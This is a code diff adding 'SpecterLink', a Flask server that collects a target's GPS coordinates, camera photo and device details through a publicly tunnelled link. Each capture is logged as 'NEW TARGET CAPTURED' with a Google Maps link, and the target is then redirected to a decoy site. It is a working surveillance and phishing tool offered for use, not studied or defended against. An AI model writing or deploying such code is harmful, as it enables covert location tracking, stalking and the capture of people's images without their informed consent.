@@ -1,0 +1,151 @@
+import os
+import sys
+import time
+import subprocess
+import threading
+import re
+import datetime
+import argparse
+from flask import Flask, render_template, request, jsonify
+
+app = Flask(__name__)
+PORT = 8080
+REDIRECT_URL = "https://google.com"
+
+def print_banner():
+    banner = r"""
+  ____                  _            _     _       _    
+ / ___| _ __   ___  ___| |_ ___ _ __| |   (_)_ __ | | __
+ \___ \| '_ \ / _ \/ __| __/ _ \ '__| |   | | '_ \| |/ /
+  ___) | |_) |  __/ (__| ||  __/ |  | |___| | | | |   < 
+ |____/| .__/ \___|\___|\__\___|_|  |_____|_|_| |_|_|\_\
+       |_|                                              
+    """
+    print(banner)
+    print("="*60)
+    print(" SpecterLink - Advanced Telemetry & Capture Server")
+    print("="*60)
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/redirect')
+def get_redirect():
+    global REDIRECT_URL
+    return jsonify({"redirect_url": REDIRECT_URL})
+
+@app.route('/report', methods=['POST'])
+def report():
+    try:
+        lat = request.form.get('lat')
+        lng = request.form.get('lng')
+        acc = request.form.get('acc', 'Unknown')
+        photo = request.files.get('photo')
+        
+        # Extended details
+        user_agent = request.form.get('user_agent', 'Unknown')
+        platform = request.form.get('platform', 'Unknown')
+        language = request.form.get('language', 'Unknown')
+        screen = request.form.get('screen', 'Unknown')
+        cores = request.form.get('cores', 'Unknown')
+        ram = request.form.get('ram', 'Unknown')
+
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        ip = request.remote_addr
+
+        print("\n" + "="*50)
+        print(f"🎯 NEW TARGET CAPTURED | {timestamp}")
+        print("="*50)
+        print(f"🌐 IP Address: {ip}")
+        print(f"📍 Location:   Lat: {lat}, Lng: {lng} (Acc: {acc}m)")
+        if lat and lng:
+            print(f"🔗 Google Maps: https://www.google.com/maps?q={lat},{lng}")
+        
+        print(f"\n💻 DEVICE INFO:")
+        print(f"   OS/Platform: {platform}")
+        print(f"   Browser:     {user_agent}")
+        print(f"   Language:    {language}")
+        print(f"   Screen Res:  {screen}")
+        print(f"   CPU Cores:   {cores}")
+        print(f"   Device RAM:  {ram} GB")
+
+        if photo:
+            filename = f"capture_{int(time.time())}.jpg"
+            filepath = os.path.join("captures", filename)
+            photo.save(filepath)
+            print(f"\n📸 PHOTO CAPTURED:")
+            print(f"   Saved to: {os.path.abspath(filepath)}")
+        else:
+            print("\n📸 PHOTO: Not provided or camera access denied.")
+
+        print("="*50 + "\n")
+
+        global REDIRECT_URL
+        return jsonify({"status": "ok", "redirect_url": REDIRECT_URL})
+
+    except Exception as e:
+        print(f"[!] Server Error: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+def run_flask():
+    # Disable werkzeug logging
+    import logging
+    log = logging.getLogger('werkzeug')
+    log.setLevel(logging.ERROR)
+    
+    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
+
+def run_cloudflared():
+    print(f"[*] Starting Cloudflare Tunnel on port {PORT}...")
+    try:
+        # Use cloudflared tunnel
+        process = subprocess.Popen(
+            ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+
+        url_found = False
+        while True:
+            line = process.stderr.readline()
+            if not line:
+                break
+            
+            # Look for the trycloudflare.com URL
+            match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
+            if match and not url_found:
+                url_found = True
+                print("\n" + "*"*60)
+                print(f"🚀 PUBLIC LINK READY: {match.group(0)}")
+                print("*"*60 + "\n")
+                print("⏳ Waiting for targets to connect...")
+
+    except FileNotFoundError:
+        print("\n[!] ERROR: 'cloudflared' is not installed or not in PATH.")
+        print("    Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/")
+        os._exit(1)
+    except Exception as e:
+        print(f"\n[!] Cloudflared Error: {e}")
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="SpecterLink - Advanced Telemetry & Capture Server")
+    parser.add_argument("-r", "--redirect", type=str, default="https://google.com", help="The URL to redirect the target to after verification")
+    args = parser.parse_args()
+    
+    REDIRECT_URL = args.redirect
+
+    os.makedirs("captures", exist_ok=True)
+    print_banner()
+    print(f"[*] Target Redirect URL: {REDIRECT_URL}")
+    
+    # Start Flask in a background thread
+    threading.Thread(target=run_flask, daemon=True).start()
+    
+    # Start Cloudflared tunnel
+    try:
+        run_cloudflared()
+    except KeyboardInterrupt:
+        print("\n[*] Exiting...")
+        os._exit(0)
